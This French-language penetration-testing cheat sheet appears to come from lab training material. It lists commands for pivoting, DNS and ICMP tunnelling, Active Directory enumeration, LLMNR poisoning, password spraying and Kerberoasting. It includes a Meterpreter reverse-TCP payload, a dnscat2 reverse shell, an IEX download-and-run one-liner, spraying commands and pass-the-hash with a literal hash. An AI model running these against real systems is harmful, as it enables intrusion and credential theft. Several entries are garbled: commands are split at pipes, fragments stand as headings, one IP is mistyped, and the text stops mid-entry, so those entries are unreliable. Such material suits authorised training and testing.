### Utilise msfveom pour générer un payload Linux Meterpreter reverse TCP qui rappelle l'IP spécifiée après `LHOST=` sur le port 8080 (`LPORT=8080`). Le payload prend la forme d'un fichier exécutable elf appelé backupjob.

```bash
`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<AdresseIPdHôteAttaque -f elf -o backupjob LPORT=8080`
```

### Utilise le protocole de copie sécurisée pour transférer un répertoire entier et tout son contenu vers une cible spécifiée.

```bash
`scp -r rpivot ubuntu@<AdresseIPDuCible>`
```

## Découverte de Réseau

### grep "bytes from" &) ;done`

```bash
`for i in {1..254} ;do (ping -c 1 172.16.5.$i \
```

### find "Reply"`

```bash
`for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \
```

### % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}`

```bash
`1..254 \
```

### Commande Metasploit qui exécute un module de ping sweep contre le segment réseau spécifié (`RHOSTS=172.16.5.0/23`).

```bash
`msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`
```

## Port Forwarding avec Meterpreter

### Commande Meterpreter utilisée pour afficher les fonctionnalités de la commande portfwd.

```bash
`meterpreter > help portfwd`
```

### Commande portfwd basée sur Meterpreter qui ajoute une règle de transfert à la session Meterpreter actuelle. Cette règle transfère le trafic réseau sur le port 3300 de la machine locale vers le port 3389 (RDP) sur la cible.

```bash
`meterpreter > portfwd add -l 3300 -p 3389 -r <AdresseIPduCible>`
```

### Utilise xfreerdp pour se connecter à un hôte distant via localhost:3300 en utilisant un ensemble d'identifiants. Des règles de redirection de port doivent être en place pour que cela fonctionne correctement.

```bash
`xfreerdp /v:localhost:3300 /u:victor /p:pass@123`
```

### Commande portfwd basée sur Meterpreter qui ajoute une règle de transfert qui dirige le trafic entrant sur le port 8081 vers le port `1234` écoutant sur l'adresse IP de l'hôte d'attaque.

```bash
`meterpreter > portfwd add -R -l 8081 -p 1234 -L <AdresseIPdHôteAttaque>`
```

### Commande basée sur Meterpreter utilisée pour exécuter la session metepreter sélectionnée en arrière-plan. Similaire à la mise en arrière-plan d'un processus sous Linux.

```bash
`meterpreter > bg`
```

## Outils Spécialisés

### Commande Metasploit qui sélectionne le module auxiliaire `socks_proxy`.

```bash
`msf6 > use auxiliary/server/socks_proxy`
```

### Commande Metasploit qui liste tous les jobs en cours d'exécution.

```bash
`msf6 auxiliary(server/socks_proxy) > jobs`
```

### Commande Metasploit utilisée pour sélectionner le module autoroute.

```bash
`msf6 > use post/multi/manage/autoroute`
```

### Utilise Socat pour écouter sur le port 8080 puis faire un fork lorsque la connexion est reçue. Il se connectera ensuite à l'hôte d'attaque sur le port 80.

```bash
`socat TCP4-LISTEN:8080,fork TCP4:<AdresseIPdHôteAttaque>:80`
```

### Utilise Socat pour écouter sur le port 8080 puis faire un fork lorsque la connexion est reçue. Ensuite, il se connectera à l'hôte cible sur le port 8443.

```bash
`socat TCP4-LISTEN:8080,fork TCP4:<AdresseIPduCible>:8443`
```

### Commande Windows qui utilise Plink.exe de PuTTY pour effectuer une redirection de port SSH dynamique et établit un tunnel SSH avec la cible spécifiée. Cela permettra le chaînage de proxy sur un hôte Windows, similaire à ce qui est fait avec Proxychains sur un hôte Linux.

```bash
`plink -D 9050 ubuntu@<AdresseIPduCible>`
```

### Utilise apt-get pour installer l'outil sshuttle.

```bash
`sudo apt-get install sshuttle`
```

### Exécute sshuttle, se connecte à l'hôte cible et crée une route vers le réseau 172.16.5.0 pour que le trafic puisse passer de l'hôte d'attaque aux hôtes sur le réseau interne (`172.16.5.0`).

```bash
`sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v`
```

### Clone le dépôt GitHub du projet rpivot.

```bash
`sudo git clone https://github.com/klsecservices/rpivot.git`
```

### Utilise apt-get pour installer python2.7.

```bash
`sudo apt-get install python2.7`
```

### Utilisé pour exécuter le serveur rpivot (`server.py`) sur le port proxy `9050`, le port serveur `9999` et écoutant sur n'importe quelle adresse IP (`0.0.0.0`).

```bash
`python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`
```

### Utilisé pour exécuter le client rpivot (`client.py`) pour se connecter au serveur rpivot spécifié sur le port approprié.

```bash
`python2.7 client.py --server-ip 10.10.14.18 --server-port 9999`
```

### Utilisé pour démarrer un serveur chisel en mode verbose écoutant sur le port `1234` en utilisant SOCKS version 5.

```bash
`./chisel server -v -p 1234 --socks5`
```

### Utilisé pour se connecter à un serveur chisel à l'adresse IP et au port spécifiés en utilisant des socks.

```bash
`./chisel client -v 10.129.202.64:1234 socks`
```

## Tunneling DNS et ICMP

### Clone le dépôt GitHub du projet `dnscat2`.

```bash
`git clone https://github.com/iagox86/dnscat2.git`
```

### Utilisé pour démarrer le serveur dnscat2.rb s'exécutant sur l'adresse IP spécifiée, le port (`53`) et utilisant le domaine `inlanefreight.local` avec l'option no-cache activée.

```bash
`sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache`
```

### Clone le dépôt Github du projet dnscat2-powershell.

```bash
`git clone https://github.com/lukebaggett/dnscat2-powershell.git`
```

### Commande PowerShell utilisée pour importer l'outil dnscat2.ps1.

```bash
`Import-Module dnscat2.ps1`
```

### Commande PowerShell utilisée pour se connecter à un serveur dnscat2 spécifié en utilisant une adresse IP, un nom de domaine et un secret prépartagé. Le client renverra une connexion shell au serveur (`-Exec cmd`).

```bash
`Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd`
```

### Utilisé pour lister les options dnscat2.

```bash
`dnscat2> ?`
```

### Utilisé pour interagir avec une session dnscat2 établie.

```bash
`dnscat2> window -i 1`
```

### Clone le dépôt GitHub du projet ptunnel-ng.

```bash
`git clone https://github.com/utoni/ptunnel-ng.git`
```

### Utilisé pour exécuter le script shell autogen.sh qui construira les fichiers ptunnel-ng nécessaires.

```bash
`sudo ./autogen.sh`
```

### Utilisé pour démarrer le serveur ptunnel-ng sur l'adresse IP spécifiée (`-r`) et le port correspondant (`-R22`).

```bash
`sudo ./ptunnel-ng -r10.129.202.64 -R22`
```

### Utilisé pour se connecter à un serveur ptunnel-ng spécifié via le port local 2222 (`-l2222`).

```bash
`sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22`
```

### Commande SSH utilisée pour se connecter à un serveur SSH via un port local. Cela peut être utilisé pour tunneler le trafic SSH à travers un tunnel ICMP.

```bash
`ssh -p2222 -lubuntu 127.0.0.1`
```

## Solutions Windows

### Recherche Metasploit qui tente de trouver un module appelé `rdp_scanner`.

```bash
`msf6 > search rdp_scanner`
```

### Commande Windows utilisée pour enregistrer le SocksOverRDP-PLugin.dll.

```bash
`regsvr32.exe SocksOverRDP-Plugin.dll`
```

### findstr 1080`

```bash
`netstat -antb \
```

### Utilisé pour exécuter le client rpivot pour se connecter à un serveur web qui utilise HTTP-Proxy avec authentification NTLM.

```bash
`python client.py --server-ip <AdresseIPduServeurWebCible> --server-port 8080 --ntlm-proxy-ip AdresseIPduProxy> --ntlm-proxy-port 8081 --domain <nomduDomaineWindows> --username <nomutilisateur> --password <motdepasse>`
```

### Commande Windows qui utilise `netsh.exe` pour configurer une règle portproxy appelée `v4tov4` qui écoute sur le port 8080 et transfère les connexions vers la destination 172.16.5.25 sur le port 3389.

```bash
`netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25`
```

### Commande Windows utilisée pour afficher les configurations d'une règle portproxy appelée v4tov4.

```bash
`netsh.exe interface portproxy show v4tov4`
```



# Active Directory

## Table des matières
1. [Énumération Initiale](#énumération-initiale)
2. [Empoisonnement LLMNR/NTB-NS](#empoisonnement-llmnrntb-ns)
3. [Pulvérisation de Mots de Passe et Politiques de Mots de Passe](#pulvérisation-de-mots-de-passe-et-politiques-de-mots-de-passe)

## Énumération Initiale

### Utilisée pour interroger le système de noms de domaine et découvrir la correspondance entre l'adresse IP et le nom de domaine de la cible entrée depuis un hôte basé sur Linux.

```bash
`nslookup ns1.inlanefreight.com`
```

### Utilisée pour commencer à capturer des paquets réseau sur l'interface réseau suivant l'option `-i` sur un hôte basé sur Linux.

```bash
`sudo tcpdump -i ens224`
```

### Utilisée pour commencer à répondre et à analyser les requêtes `LLMNR`, `NBT-NS` et `MDNS` sur l'interface spécifiée après l'option `-I` et fonctionnant en mode `Analyse Passive`, activé avec `-A`. Exécutée depuis un hôte basé sur Linux.

```bash
`sudo responder -I ens224 -A`
```

### Effectue un balayage ping sur le segment de réseau spécifié depuis un hôte basé sur Linux.

```bash
`fping -asgq 172.16.5.0/23`
```

### Effectue un scan nmap avec détection du système d'exploitation, détection de version, analyse de scripts et traceroute activés (`-A`) basé sur une liste d'hôtes (`hosts.txt`) spécifiée dans le fichier suivant `-iL`. Puis enregistre les résultats du scan dans le fichier spécifié après l'option `-oN`. Exécuté depuis un hôte basé sur Linux.

```bash
`sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum`
```

### Utilise `git` pour cloner l'outil kerbrute depuis un hôte basé sur Linux.

```bash
`sudo git clone https://github.com/ropnop/kerbrute.git`
```

### Utilisée pour lister les options de compilation possibles avec `make` depuis un hôte basé sur Linux.

```bash
`make help`
```

### Utilisée pour compiler un binaire `Kerbrute` pour plusieurs plateformes OS et architectures CPU.

```bash
`sudo make all`
```

### Utilisée pour tester le binaire `Kebrute` compilé choisi depuis un hôte basé sur Linux.

```bash
`./kerbrute_linux_amd64`
```

### Utilisée pour déplacer le binaire `Kerbrute` dans un répertoire qui peut être défini dans le chemin d'un utilisateur Linux. Facilitant l'utilisation de l'outil.

```bash
`sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute`
```

### Exécute l'outil Kerbrute pour découvrir les noms d'utilisateurs dans le domaine (`INLANEFREIGHT.LOCAL`) spécifié après l'option `-d` et le contrôleur de domaine associé spécifié après `--dc` en utilisant une liste de mots et enregistre (`-o`) les résultats dans un fichier spécifié. Exécuté depuis un hôte basé sur Linux.

```bash
`./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results`
```

## Empoisonnement LLMNR/NTB-NS

### Utilisée pour afficher les instructions d'utilisation et les diverses options disponibles dans `Responder` depuis un hôte basé sur Linux.

```bash
`responder -h`
```

### Utilise `hashcat` pour cracker les hash `NTLMv2` (`-m`) qui ont été capturés par responder et sauvegardés dans un fichier (`frond_ntlmv2`). Le craquage est effectué sur la base d'une liste de mots spécifiée.

```bash
`hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt`
```

### Utilise le cmdlet `Import-Module` de PowerShell pour importer l'outil basé sur Windows `Inveigh.ps1`.

```bash
`Import-Module .\Inveigh.ps1`
```

### Utilisée pour afficher de nombreuses options et fonctionnalités disponibles avec `Invoke-Inveigh`. Exécutée depuis un hôte basé sur Windows.

```bash
`(Get-Command Invoke-Inveigh).Parameters`
```

### Démarre `Inveigh` sur un hôte basé sur Windows avec l'usurpation LLMNR et NBNS activée et enregistre les résultats dans un fichier.

```bash
`Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`
```

### Démarre l'implémentation `C#` d'`Inveigh` depuis un hôte basé sur Windows.

```bash
`.\Inveigh.exe`
```

### foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}`

```bash
`$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \
```

## Pulvérisation de Mots de Passe et Politiques de Mots de Passe

### Script Bash utilisé pour générer `16,079,616` combinaisons de noms d'utilisateurs possibles depuis un hôte basé sur Linux.

```bash
`#!/bin/bash for x in {A..Z}{A..Z}{A..Z}{A..Z} do echo $x; done`
```

### Utilise `CrackMapExec` et des identifiants valides (`avazquez:Password123`) pour énumérer la politique de mot de passe (`--pass-pol`) depuis un hôte basé sur Linux.

```bash
`crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol`
```

### Utilise `rpcclient` pour découvrir des informations sur le domaine via des sessions `SMB NULL`. Exécutée depuis un hôte basé sur Linux.

```bash
`rpcclient -U "" -N 172.16.5.5`
```

### Utilise `rpcclient` pour énumérer la politique de mot de passe dans un domaine Windows cible depuis un hôte basé sur Linux.

```bash
`rpcclient $> querydominfo`
```

### Utilise `enum4linux` pour énumérer la politique de mot de passe (`-P`) dans un domaine Windows cible depuis un hôte basé sur Linux.

```bash
`enum4linux -P 172.16.5.5`
```

### Utilise `enum4linux-ng` pour énumérer la politique de mot de passe (`-P`) dans un domaine Windows cible depuis un hôte basé sur Linux, puis présente la sortie en YAML et JSON sauvegardée dans un fichier après l'option `-oA`.

```bash
`enum4linux-ng -P 172.16.5.5 -oA ilfreight`
```

### grep -m 1 -B 10 pwdHistoryLength`

```bash
`ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" \
```

### Utilisée pour énumérer la politique de mot de passe dans un domaine Windows depuis un hôte basé sur Windows.

```bash
`net accounts`
```

### Utilise le cmdlet Import-Module pour importer l'outil `PowerView.ps1` depuis un hôte basé sur Windows.

```bash
`Import-Module .\PowerView.ps1`
```

### Utilisée pour énumérer la politique de mot de passe dans un domaine Windows cible depuis un hôte basé sur Windows.

```bash
`Get-DomainPolicy`
```

### grep "user:" \

```bash
`enum4linux -U 172.16.5.5 \
```

### Utilise rpcclient pour découvrir les comptes utilisateurs dans un domaine Windows cible depuis un hôte basé sur Linux.

```bash
`rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser`
```

### Utilise `CrackMapExec` pour découvrir les utilisateurs (`--users`) dans un domaine Windows cible depuis un hôte basé sur Linux.

```bash
`crackmapexec smb 172.16.5.5 --users`
```

### grep sAMAccountName: \

```bash
`ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" \
```

### Utilise l'outil Python `windapsearch.py` pour découvrir les utilisateurs dans un domaine Windows cible depuis un hôte basé sur Linux.

```bash
`./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`
```

### grep Authority; done`

```bash
`for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \
```

### Utilise `kerbrute` et une liste d'utilisateurs (`valid_users.txt`) pour effectuer une attaque de pulvérisation de mot de passe contre un domaine Windows cible depuis un hôte basé sur Linux.

```bash
`kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`
```

### grep +`

```bash
`sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \
```

### Utilise `CrackMapExec` pour valider un ensemble d'identifiants depuis un hôte basé sur Linux.

```bash
`sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`
```

### grep +`

```bash
`sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \
```

### Utilisé pour importer l'outil basé sur PowerShell `DomainPasswordSpray.ps1` depuis un hôte basé sur Windows.

```bash
`Import-Module .\DomainPasswordSpray.ps1`
```

### Effectue une attaque de pulvérisation de mot de passe et enregistre (-OutFile) les résultats dans un fichier spécifié (`spray_success`) depuis un hôte basé sur Windows.

```bash
`Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue`
```


# Énumération de Contrôles de Sécurité et Active Directory

## Table des matières
1. [Énumération des Contrôles de Sécurité](#énumération-des-contrôles-de-sécurité)
2. [Énumération avec Identifiants](#énumération-avec-identifiants)
3. [Énumération par "Living Off the Land"](#énumération-par-living-off-the-land)

## Énumération des Contrôles de Sécurité

### Cmdlet PowerShell utilisé pour vérifier le statut de `Windows Defender Anti-Virus` depuis un hôte basé sur Windows.

```bash
`Get-MpComputerStatus`
```

### select -ExpandProperty RuleCollections`

```bash
`Get-AppLockerPolicy -Effective \
```

### Script PowerShell utilisé pour découvrir le `Mode de Langage PowerShell` utilisé sur un hôte basé sur Windows. Exécuté depuis un hôte basé sur Windows.

```bash
`$ExecutionContext.SessionState.LanguageMode`
```

### Une fonction `LAPSToolkit` qui découvre les `Groupes Délégués LAPS` depuis un hôte basé sur Windows.

```bash
`Find-LAPSDelegatedGroups`
```

### Une fonction `LAPSTookit` qui vérifie les droits sur chaque ordinateur avec LAPS activé pour tous les groupes ayant un accès en lecture et les utilisateurs avec `Tous les Droits Étendus`. Exécutée depuis un hôte basé sur Windows.

```bash
`Find-AdmPwdExtendedRights`
```

### Une fonction `LAPSToolkit` qui recherche les ordinateurs qui ont LAPS activé, découvre l'expiration des mots de passe et peut découvrir les mots de passe aléatoires. Exécutée depuis un hôte basé sur Windows.

```bash
`Get-LAPSComputers`
```

## Énumération avec Identifiants

### Se connecte à une cible Windows en utilisant des identifiants valides. Exécutée depuis un hôte basé sur Linux.

```bash
`xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25`
```

### S'authentifie auprès d'une cible Windows via `smb` en utilisant des identifiants valides et tente de découvrir plus d'utilisateurs (`--users`) dans un domaine Windows cible. Exécutée depuis un hôte basé sur Linux.

```bash
`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users`
```

### S'authentifie auprès d'une cible Windows via `smb` en utilisant des identifiants valides et tente de découvrir des groupes (`--groups`) dans un domaine Windows cible. Exécutée depuis un hôte basé sur Linux.

```bash
`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups`
```

### S'authentifie auprès d'une cible Windows via `smb` en utilisant des identifiants valides et tente de vérifier une liste d'utilisateurs connectés (`--loggedon-users`) sur l'hôte Windows cible. Exécutée depuis un hôte basé sur Linux.

```bash
`sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users`
```

### S'authentifie auprès d'une cible Windows via `smb` en utilisant des identifiants valides et tente de découvrir tous les partages smb (`--shares`). Exécutée depuis un hôte basé sur Linux.

```bash
`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares`
```

### S'authentifie auprès d'une cible Windows via `smb` en utilisant des identifiants valides et utilise le module CrackMapExec (`-M`) `spider_plus` pour parcourir chaque partage lisible (`Dev-share`) et lister tous les fichiers lisibles. Les résultats sont affichés en `JSON`. Exécutée depuis un hôte basé sur Linux.

```bash
`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share`
```

### Énumère le domaine Windows cible en utilisant des identifiants valides et liste les partages et les permissions disponibles sur chacun dans le contexte des identifiants valides utilisés et de l'hôte Windows cible (`-H`). Exécutée depuis un hôte basé sur Linux.

```bash
`smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5`
```

### Énumère le domaine Windows cible en utilisant des identifiants valides et effectue une liste récursive (`-R`) du partage spécifié (`SYSVOL`) et n'affiche qu'une liste de répertoires (`--dir-only`) dans le partage. Exécutée depuis un hôte basé sur Linux.

```bash
`smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only`
```

### Énumère un compte utilisateur cible dans un domaine Windows en utilisant son identifiant relatif (`0x457`). Exécutée depuis un hôte basé sur Linux.

```bash
`rpcclient $> queryuser 0x457`
```

### Découvre les comptes utilisateurs dans un domaine Windows cible et leurs identifiants relatifs associés (`rid`). Exécutée depuis un hôte basé sur Linux.

```bash
`rpcclient $> enumdomusers`
```

### Outil Impacket utilisé pour se connecter à la `CLI` d'une cible Windows via le partage administratif `ADMIN$` avec des identifiants valides. Exécuté depuis un hôte basé sur Linux.

```bash
`psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125`
```

### Outil Impacket utilisé pour se connecter à la `CLI` d'une cible Windows via `WMI` avec des identifiants valides. Exécuté depuis un hôte basé sur Linux.

```bash
`wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5`
```

### Utilisé pour afficher les options et la fonctionnalité de windapsearch.py. Exécuté depuis un hôte basé sur Linux.

```bash
`windapsearch.py -h`
```

### Utilisé pour énumérer le groupe des administrateurs de domaine (`--da`) en utilisant un ensemble d'identifiants valides sur un domaine Windows cible. Exécuté depuis un hôte basé sur Linux.

```bash
`python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da`
```

### Utilisé pour effectuer une recherche récursive (`-PU`) d'utilisateurs avec des permissions imbriquées en utilisant des identifiants valides. Exécuté depuis un hôte basé sur Linux.

```bash
`python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 -PU`
```

### Exécute l'implémentation python de BloodHound (`bloodhound.py`) avec des identifiants valides et spécifie un serveur de noms (`-ns`) et un domaine Windows cible (`inlanefreight.local`) ainsi qu'exécute toutes les vérifications (`-c all`). Fonctionne avec des identifiants valides. Exécuté depuis un hôte basé sur Linux.

```bash
`sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all`
```

## Énumération par "Living Off the Land"

### Cmdlet PowerShell utilisé pour lister tous les modules disponibles, leur version et options de commande depuis un hôte basé sur Windows.

```bash
`Get-Module`
```

### Charge le module PowerShell `Active Directory` depuis un hôte basé sur Windows.

```bash
`Import-Module ActiveDirectory`
```

### Cmdlet PowerShell utilisé pour recueillir des informations sur le domaine Windows depuis un hôte basé sur Windows.

```bash
`Get-ADDomain`
```

### Cmdlet PowerShell utilisé pour énumérer les comptes utilisateurs sur un domaine Windows cible et filtrer par `ServicePrincipalName`. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
```

### Cmdlet PowerShell utilisé pour énumérer toutes les relations de confiance dans un domaine Windows cible et filtre par tous (`-Filter *`). Exécuté depuis un hôte basé sur Windows.

```bash
`Get-ADTrust -Filter *`
```

### select name`

```bash
`Get-ADGroup -Filter * \
```

### Cmdlet PowerShell utilisé pour rechercher un groupe spécifique (`-Identity "Backup Operators"`). Exécuté depuis un hôte basé sur Windows.

```bash
`Get-ADGroup -Identity "Backup Operators"`
```

### Cmdlet PowerShell utilisé pour découvrir les membres d'un groupe spécifique (`-Identity "Backup Operators"`). Exécuté depuis un hôte basé sur Windows.

```bash
`Get-ADGroupMember -Identity "Backup Operators"`
```

### Script PowerView utilisé pour ajouter des résultats à un fichier `CSV`. Exécuté depuis un hôte basé sur Windows.

```bash
`Export-PowerViewCSV`
```

### Script PowerView utilisé pour convertir un nom d'`Utilisateur` ou de `Groupe` en son `SID`. Exécuté depuis un hôte basé sur Windows.

```bash
`ConvertTo-SID`
```

### Script PowerView utilisé pour demander le ticket kerberos pour un nom principal de service spécifié (`SPN`). Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainSPNTicket`
```

### Script PowerView utilisé pour retourner l'objet AD pour le domaine actuel (ou spécifié). Exécuté depuis un hôte basé sur Windows.

```bash
`Get-Domain`
```

### Script PowerView utilisé pour retourner une liste des contrôleurs de domaine cibles pour le domaine cible spécifié. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainController`
```

### Script PowerView utilisé pour retourner tous les utilisateurs ou des objets utilisateurs spécifiques dans AD. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainUser`
```

### Script PowerView utilisé pour retourner tous les ordinateurs ou des objets ordinateurs spécifiques dans AD. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainComputer`
```

### Script PowerView utilisé pour retourner tous les groupes ou des objets groupes spécifiques dans AD. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainGroup`
```

### Script PowerView utilisé pour rechercher tous les objets OU ou des objets OU spécifiques dans AD. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainOU`
```

### Script PowerView utilisé pour trouver des `ACL` d'objets dans le domaine avec des droits de modification définis pour des objets non intégrés. Exécuté depuis un hôte basé sur Windows.

```bash
`Find-InterestingDomainAcl`
```

### Script PowerView utilisé pour retourner les membres d'un groupe de domaine spécifique. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainGroupMember`
```

### Script PowerView utilisé pour retourner une liste de serveurs fonctionnant probablement comme des serveurs de fichiers. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainFileServer`
```

### Script PowerView utilisé pour retourner une liste de tous les systèmes de fichiers distribués pour le domaine actuel (ou spécifié). Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainDFSShare`
```

### Script PowerView utilisé pour retourner tous les GPO ou des objets GPO spécifiques dans AD. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainGPO`
```

### Script PowerView utilisé pour retourner la politique de domaine par défaut ou la politique de contrôleur de domaine pour le domaine actuel. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainPolicy`
```

### Script PowerView utilisé pour énumérer les groupes locaux sur une machine locale ou distante. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-NetLocalGroup`
```

### Script PowerView utilisé pour énumérer les membres d'un groupe local spécifique. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-NetLocalGroupMember`
```

### Script PowerView utilisé pour retourner une liste de partages ouverts sur une machine locale (ou distante). Exécuté depuis un hôte basé sur Windows.

```bash
`Get-NetShare`
```

### Script PowerView utilisé pour retourner les informations de session pour la machine locale (ou distante). Exécuté depuis un hôte basé sur Windows.

```bash
`Get-NetSession`
```

### Script PowerView utilisé pour tester si l'utilisateur actuel a un accès administratif à la machine locale (ou distante). Exécuté depuis un hôte basé sur Windows.

```bash
`Test-AdminAccess`
```

### Script PowerView utilisé pour trouver les machines où des utilisateurs spécifiques sont connectés. Exécuté depuis un hôte basé sur Windows.

```bash
`Find-DomainUserLocation`
```

### Script PowerView utilisé pour trouver des partages accessibles sur les machines du domaine. Exécuté depuis un hôte basé sur Windows.

```bash
`Find-DomainShare`
```

### Script PowerView qui recherche des fichiers correspondant à des critères spécifiques sur des partages lisibles dans le domaine. Exécuté depuis un hôte basé sur Windows.

```bash
`Find-InterestingDomainShareFile`
```

### Script PowerView utilisé pour trouver des machines sur le domaine local où l'utilisateur actuel a un accès administrateur local. Exécuté depuis un hôte basé sur Windows.

```bash
`Find-LocalAdminAccess`
```

### Script PowerView qui retourne les relations de confiance du domaine pour le domaine actuel ou un domaine spécifié. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainTrust`
```

### Script PowerView qui retourne toutes les relations de confiance de forêt pour la forêt actuelle ou une forêt spécifiée. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-ForestTrust`
```

### Script PowerView qui énumère les utilisateurs qui sont dans des groupes en dehors du domaine de l'utilisateur. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainForeignUser`
```

### Script PowerView qui énumère les groupes avec des utilisateurs en dehors du domaine du groupe et retourne chaque membre étranger. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainForeignGroupMember`
```

### Script PowerView qui énumère toutes les relations de confiance pour le domaine actuel et tout autre domaine visible. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainTrustMapping`
```

### Script PowerView utilisé pour lister tous les membres d'un groupe cible (`"Domain Admins"`) grâce à l'utilisation de l'option récursive (`-Recurse`). Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainGroupMember -Identity "Domain Admins" -Recurse`
```

### Script PowerView utilisé pour trouver des utilisateurs sur le domaine Windows cible qui ont le `Service Principal Name` défini. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName`
```

### Exécute un outil appelé `Snaffler` contre un domaine Windows cible qui trouve différents types de données dans les partages auxquels le compte compromis a accès. Exécuté depuis un hôte basé sur Windows.

```bash
`.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data`
```


# Transfert de Fichiers, Kerberoasting et Énumération ACL

## Table des matières
1. [Transfert de Fichiers](#transfert-de-fichiers)
2. [Kerberoasting](#kerberoasting)
3. [Énumération et Tactiques ACL](#énumération-et-tactiques-acl)

## Transfert de Fichiers

### Démarre un serveur web Python pour l'hébergement rapide de fichiers. Exécuté depuis un hôte basé sur Linux.

```bash
`sudo python3 -m http.server 8001`
```

### One-liner PowerShell utilisé pour télécharger un fichier depuis un serveur web. Exécuté depuis un hôte basé sur Windows.

```bash
`"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"`
```

### Démarre un serveur `SMB` impacket pour l'hébergement rapide d'un fichier. Exécuté depuis un hôte basé sur Windows.

```bash
`impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/`
```

## Kerberoasting

### Utilisé pour installer Impacket à partir du répertoire qui a été cloné sur l'hôte d'attaque. Exécuté depuis un hôte basé sur Linux.

```bash
`sudo python3 -m pip install .`
```

### Outil Impacket utilisé pour afficher les options et la fonctionnalité de `GetUserSPNs.py` depuis un hôte basé sur Linux.

```bash
`GetUserSPNs.py -h`
```

### Outil Impacket utilisé pour obtenir une liste de `SPN` sur le domaine Windows cible depuis un hôte basé sur Linux.

```bash
`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday`
```

### Outil Impacket utilisé pour télécharger/demander (`-request`) tous les tickets TGS pour un traitement hors ligne depuis un hôte basé sur Linux.

```bash
`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request`
```

### Outil Impacket utilisé pour télécharger/demander (`-request-user`) un ticket TGS pour un compte utilisateur spécifique (`sqldev`) depuis un hôte basé sur Linux.

```bash
